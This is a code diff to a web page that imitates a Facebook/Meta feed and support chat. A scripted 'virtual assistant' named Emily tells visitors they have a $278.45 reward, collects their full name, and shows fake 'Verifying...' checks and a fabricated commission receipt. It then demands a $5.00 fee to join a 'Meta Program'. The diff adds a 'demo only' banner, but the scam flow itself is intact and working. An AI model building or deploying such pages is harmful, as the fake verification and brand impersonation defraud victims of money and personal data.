@@ -176,6 +176,7 @@
       --fb-red: #e32636;
     }
     body { background: var(--fb-bg); color: var(--fb-text); font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
+    .demo-banner { position: sticky; top: 0; z-index: 1000; display: grid; flex: none; place-items: center; width: 100%; min-height: 40px; padding: 8px 12px; background: #b45309; color: white; font-size: 13px; font-weight: 800; letter-spacing: .06em; text-align: center; }
     .fb-shell { width: 100%; max-width: 430px; min-height: 100svh; margin: 0 auto; background: var(--fb-bg); box-shadow: 0 0 24px rgba(28,30,33,.08); }
     .fb-header { position: sticky; top: 0; z-index: 50; display: flex; align-items: center; justify-content: space-between; min-height: 56px; padding: 8px 12px; background: var(--fb-surface); border-bottom: 1px solid var(--fb-line); }
     .fb-header-logo { width: 116px; height: auto; }
@@ -194,7 +195,7 @@
     .fb-start { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; min-height: 46px; margin-top: 14px; border-radius: 6px; background: var(--fb-blue); color: white; font-size: 15px; font-weight: 700; transition: background .15s ease, transform .15s ease; }
     .fb-start:hover { background: #166fe5; }
     .fb-start:active { transform: scale(.985); }
-    .fb-feed { padding-bottom: calc(150px + env(safe-area-inset-bottom)); }
+    .fb-feed { padding-bottom: 20px; }
     .fb-post { margin: 8px 0 0; overflow: hidden; background: var(--fb-surface); border-top: 1px solid var(--fb-line); border-bottom: 1px solid var(--fb-line); }
     .fb-post-head { display: flex; align-items: center; gap: 9px; padding: 12px 12px 9px; }
     .fb-avatar { width: 40px; height: 40px; flex: none; overflow: hidden; border: 1px solid var(--fb-line); border-radius: 50%; background: var(--fb-surface); }
@@ -218,7 +219,7 @@
     .fb-stat-right { display: flex; gap: 12px; }
     .fb-actions { display: grid; grid-template-columns: repeat(3, 1fr); padding: 3px 5px; }
     .fb-action { display: flex; align-items: center; justify-content: center; gap: 7px; min-height: 44px; border-radius: 5px; color: var(--fb-muted); font-size: 13px; font-weight: 600; }
-    .fb-survey { position: fixed; right: 0; bottom: 0; left: 0; z-index: 45; width: min(100%, 430px); margin: 0 auto; padding: 10px 12px max(10px, env(safe-area-inset-bottom)); background: var(--fb-surface); border-top: 1px solid var(--fb-line); box-shadow: 0 -4px 16px rgba(28,30,33,.12); text-align: center; }
+    .fb-survey { width: 100%; padding: 12px 12px max(14px, env(safe-area-inset-bottom)); background: var(--fb-surface); border-top: 8px solid var(--fb-bg); text-align: center; }
     .fb-survey-kicker { color: var(--fb-muted); font-size: 12px; font-weight: 600; text-transform: uppercase; }
     .fb-question { margin-top: 3px; color: var(--fb-text); font-size: 16px; line-height: 1.2; font-weight: 700; }
     .fb-votes { display: grid; grid-template-columns: minmax(0,1fr) minmax(0,1fr); gap: 8px; margin-top: 9px; }
@@ -229,12 +230,16 @@
     .fb-vote:active { transform: scale(.98); }
     .fb-vote-no { background: var(--fb-red); }
     .fb-vote-yes { background: var(--fb-green); }
-    .support-shell { display: flex; flex-direction: column; width: 100%; height: 100svh; height: 100dvh; min-height: 580px; background: var(--fb-surface); }
+    .support-shell { display: flex; flex-direction: column; width: 100%; height: calc(100svh - 40px); height: calc(100dvh - 40px); min-height: 540px; background: var(--fb-surface); }
     html.chat-full, body.chat-full { width: 100%; height: 100%; overflow: hidden; overscroll-behavior: none; background: var(--fb-surface); }
-    body.chat-full .support-shell { min-height: 100svh; min-height: 100dvh; }
+    body.chat-full .support-shell { min-height: calc(100svh - 40px); min-height: calc(100dvh - 40px); }
     .support-header { position: relative; z-index: 3; display: flex; flex: none; align-items: center; justify-content: space-between; min-height: 58px; padding: 0 14px; background: var(--fb-surface); }
     .support-header .fb-header-logo { width: 118px; height: auto; }
     .support-balance { margin-left: auto; }
+    .support-agent { display: flex; flex: none; align-items: center; gap: 10px; padding: 10px 14px; border-top: 1px solid var(--fb-line); border-bottom: 1px solid var(--fb-line); background: var(--fb-surface); }
+    .support-agent-avatar { width: 38px; height: 38px; flex: none; border-radius: 50%; object-fit: cover; }
+    .support-agent-name { color: var(--fb-text); font-size: 14px; font-weight: 700; line-height: 1.25; }
+    .support-agent-note { color: var(--fb-muted); font-size: 12px; line-height: 1.25; }
     .support-chat { display: flex; flex: 1; min-height: 0; flex-direction: column; gap: 11px; overflow-y: auto; padding: 14px 14px 18px; background: transparent; scroll-behavior: smooth; -webkit-overflow-scrolling: touch; }
     .support-row { display: flex; align-items: flex-end; gap: 8px; max-width: 100%; animation: chatIn .34s cubic-bezier(.2,.8,.2,1) both; }
     .support-row.user { justify-content: flex-end; }
@@ -242,12 +247,19 @@
     .support-bubble { display: inline-block; max-width: 78%; padding: 11px 14px; border: 1px solid rgba(18,18,18,.06); border-radius: 18px 18px 18px 5px; background: #fff; color: #121212; font-size: 14.5px; line-height: 1.45; text-align: left; overflow-wrap: anywhere; box-shadow: 0 3px 12px rgba(18,18,18,.10), 0 1px 2px rgba(18,18,18,.06); }
     .support-row.user .support-bubble { border-color: var(--fb-blue); border-radius: 18px 18px 5px 18px; background: var(--fb-blue); color: white; font-weight: 600; box-shadow: 0 3px 12px rgba(24,119,242,.2); }
     .support-bubble strong { font-weight: 700; }
+    .support-confirm-icon { display: inline-flex; align-items: center; justify-content: center; width: 17px; height: 17px; margin-right: 8px; border: 2px solid #16a34a; border-radius: 50%; color: #16a34a; font-size: 11px; font-weight: 700; vertical-align: -2px; }
+    .support-eligibility { display: flex; align-items: flex-start; gap: 8px; }
+    .support-eligibility .support-confirm-icon { margin: 2px 0 0; flex: none; }
+    .support-notice { display: flex; align-items: flex-start; gap: 10px; }
+    .support-warning-icon { flex: none; color: #b76b0b; font-size: 19px; line-height: 1.1; }
     .support-typing { display: inline-flex; align-items: center; gap: 4px; min-width: 54px; padding: 12px 14px; }
     .support-typing span { width: 6px; height: 6px; border-radius: 50%; background: #8a8d91; animation: typingDot 1s ease-in-out infinite; }
     .support-typing span:nth-child(2) { animation-delay: .15s; }
     .support-typing span:nth-child(3) { animation-delay: .3s; }
     .support-receipt-loading { display: inline-flex; align-items: center; gap: 10px; min-width: 210px; }
     .support-receipt-spinner { width: 22px; height: 22px; flex: none; border: 3px solid #ccd0d5; border-top-color: var(--fb-blue); border-radius: 50%; animation: receiptSpin .75s linear infinite; }
+    .support-message-loading { display: inline-flex; align-items: center; gap: 9px; min-width: 145px; min-height: 42px; font-size: 13px; font-weight: 600; }
+    .support-message-loading .support-receipt-spinner { width: 18px; height: 18px; border-width: 2px; }
     .support-receipt-loading-text { font-size: 13px; font-weight: 600; }
     .support-receipt { width: min(330px, calc(100vw - 58px)); overflow: hidden; border: 1px solid var(--fb-line); border-radius: 12px; background: white; color: #171717; box-shadow: 0 6px 20px rgba(28,30,33,.14); }
     .support-receipt-head { display: flex; align-items: center; justify-content: space-between; gap: 8px; padding: 10px 12px; background: #171717; color: white; }
@@ -314,7 +326,7 @@
       .fb-media { height: auto; max-height: none; object-fit: contain; }
       .fb-stats { min-height: 36px; margin-inline: 10px; }
       .fb-actions { display: none; }
-      .fb-feed { padding-bottom: calc(132px + env(safe-area-inset-bottom)); }
+      .fb-feed { padding-bottom: 16px; }
       .fb-survey-kicker { font-size: 10px; }
       .fb-question { font-size: 14px; }
       .fb-vote { min-height: 40px; }
@@ -322,14 +334,14 @@
     @media (max-width: 767px) {
       body.chat-full #step-4 {
         position: fixed;
-        top: var(--chat-viewport-top, 0px);
+        top: var(--chat-viewport-top, 40px);
         right: 0;
         bottom: auto;
         left: 0;
         z-index: 90;
         display: block;
         width: 100%;
-        height: var(--chat-viewport-height, 100dvh);
+        height: var(--chat-viewport-height, calc(100dvh - 40px));
         overflow: hidden;
         background: var(--fb-surface);
       }
@@ -348,6 +360,7 @@
   </style>
 </head>
 <body class="flex flex-col min-w-0 min-h-svh items-center antialiased">
+  <div class="demo-banner" role="note">APENAS DEMONSTRAÇÃO</div>
 
   
 
@@ -436,6 +449,10 @@
               <span id="balance-chat">$ 278.45</span>
             </div>
           </header>
+          <div class="support-agent" aria-label="Emily Carter, virtual assistant">
+            <img class="support-agent-avatar" src="images/emily-support.webp" alt="">
+            <div><div class="support-agent-name">Emily Carter</div><div class="support-agent-note">Virtual assistant</div></div>
+          </div>
           <main id="support-chat" class="support-chat" aria-live="polite"></main>
           <footer class="support-footer">
             <button id="support-choice" type="button" class="support-choice" onclick="answerSupport()"></button>
@@ -596,8 +613,9 @@
     var viewport = window.visualViewport;
     var height = viewport ? viewport.height : window.innerHeight;
     var top = viewport ? viewport.offsetTop : 0;
-    document.documentElement.style.setProperty("--chat-viewport-height", Math.round(height) + "px");
-    document.documentElement.style.setProperty("--chat-viewport-top", Math.round(top) + "px");
+    var bannerHeight = document.querySelector(".demo-banner").offsetHeight;
+    document.documentElement.style.setProperty("--chat-viewport-height", Math.round(Math.max(0, height - bannerHeight)) + "px");
+    document.documentElement.style.setProperty("--chat-viewport-top", Math.round(top + bannerHeight) + "px");
     if (document.body.classList.contains("chat-full")) supportScroll();
   }
   syncChatViewport();
@@ -763,20 +781,24 @@
     { type:"wait", ms:1500 },
     { type:"text", text:"My name is Emily and I'll help you redeem your reward." },
     { type:"wait", ms:1000 },
-    { type:"text", text:"Before we continue, please enter your <strong>full name</strong> to continue with your registration." },
-    { type:"input", field:"name", placeholder:"Full name" },
-    { type:"wait", ms:1000 },
     { type:"text", text:"You have a balance of <strong>$278.45</strong> in our app" },
     { type:"wait", ms:2000 },
-    { type:"text", text:"Would you like to continue and withdraw <strong>your money?</strong>" },
+    { type:"text", text:"Would you like to continue so you can <strong>withdraw your money?</strong>" },
     { type:"choice", label:"Yes, I want to withdraw my money" },
-    { type:"wait", ms:1500 },
-    { type:"text", text:"<strong>Here is the receipt of your commissions 👇🏻</strong>" },
-    { type:"receiptLoading", ms:3500 },
+    { type:"messageLoading", ms:3000 },
+    { type:"text", noTyping:true, text:"<span class=\"support-confirm-icon\" aria-hidden=\"true\">✓</span>Okay, I'll continue with your registration." },
+    { type:"wait", ms:1000 },
+    { type:"text", text:"At this stage, I need you to tell me your name so I can verify that you're a new user." },
+    { type:"input", field:"name", placeholder:"Full name" },
+    { type:"messageLoading", ms:3000 },
+    { type:"eligibility", noTyping:true },
+    { type:"wait", ms:1000 },
+    { type:"text", text:"I'm sending you the receipt for your commissions." },
+    { type:"receiptLoading", ms:3000 },
     { type:"receipt" },
     { type:"wait", ms:2000 },
     { type:"choice", label:"I want to claim my reward" },
-    { type:"text", text:"<strong>You'll be granted access to withdraw your commission after this short explanatory video</strong>" },
+    { type:"text", text:"<span class=\"support-notice\"><span class=\"support-warning-icon\" aria-hidden=\"true\">⚠︎</span><span>Your access to withdraw your commission will be granted after this short explanatory video</span></span>" },
     { type:"video" },
     { type:"wait", ms:23000 },
     { type:"text", text:"<strong>To receive your $278.45 reward.</strong><br><br>You'll need to pay <strong>a small $5.00 fee</strong> to secure your spot in our <strong>Meta Program</strong>" },
@@ -813,6 +835,25 @@
     row.innerHTML = '<img class="support-mini-avatar" src="images/emily-support.webp" alt=""><div class="support-bubble support-typing"><span></span><span></span><span></span></div>';
     chat.appendChild(row);
     supportScroll();
+  }
+
+  function showSupportMessageLoading(duration) {
+    var chat = document.getElementById("support-chat");
+    if (!chat) return;
+    supportTyping(false);
+    var row = document.createElement("div");
+    row.className = "support-row";
+    row.innerHTML = '<img class="support-mini-avatar" src="images/emily-support.webp" alt=""><div class="support-bubble support-message-loading" role="status" aria-live="polite"><span class="support-receipt-spinner" aria-hidden="true"></span><span class="support-message-loading-text">Verifying...</span></div>';
+    chat.appendChild(row);
+    supportScroll();
+    setTimeout(function () {
+      if (row.isConnected) row.querySelector(".support-message-loading-text").textContent = "Checking...";
+    }, duration / 2);
+    setTimeout(function () {
+      row.remove();
+      supportIndex += 1;
+      runSupportStep();
+    }, duration);
   }
 
   function addSupportBubble(kind, html) {
@@ -865,7 +906,7 @@
     var row = document.createElement("div");
     row.id = "support-receipt-loading";
     row.className = "support-row";
-    row.innerHTML = '<img class="support-mini-avatar" src="images/emily-support.webp" alt=""><div class="support-bubble support-receipt-loading"><span class="support-receipt-spinner" aria-hidden="true"></span><span class="support-receipt-loading-text">Generating your receipt…</span></div>';
+    row.innerHTML = '<img class="support-mini-avatar" src="images/emily-support.webp" alt=""><div class="support-bubble support-receipt-loading"><span class="support-receipt-spinner" aria-hidden="true"></span><span class="support-receipt-loading-text">Generating your commission withdrawal receipt...</span></div>';
     chat.appendChild(row);
     supportScroll();
     setTimeout(function () {
@@ -923,14 +964,27 @@
     var step = SUPPORT_STEPS[supportIndex];
     if (step.type === "wait") {
       var next = SUPPORT_STEPS[supportIndex + 1];
-      if (next && next.type === "text") supportTyping(true);
+      if (next && (next.type === "text" || next.type === "eligibility")) supportTyping(true);
       supportIndex += 1;
       setTimeout(runSupportStep, step.ms);
       return;
     }
     if (step.type === "text") {
-      supportTyping(true);
-      setTimeout(function(){ addSupportBubble("agent", step.text); supportIndex += 1; runSupportStep(); }, 500);
+      if (!step.noTyping) supportTyping(true);
+      setTimeout(function(){ addSupportBubble("agent", step.text); supportIndex += 1; runSupportStep(); }, step.noTyping ? 0 : 500);
+      return;
+    }
+    if (step.type === "eligibility") {
+      if (!step.noTyping) supportTyping(true);
+      setTimeout(function(){
+        addSupportBubble("agent", '<span class="support-eligibility"><span class="support-confirm-icon" aria-hidden="true">✓</span><span>Everything looks good, ' + escapeSupportText(supportName) + '!<br><br>I checked our system and saw that you are eligible to receive your commission of $278.45.</span></span>');
+        supportIndex += 1;
+        runSupportStep();
+      }, step.noTyping ? 0 : 500);
+      return;
+    }
+    if (step.type === "messageLoading") {
+      showSupportMessageLoading(step.ms);
       return;
     }
     if (step.type === "receipt") {
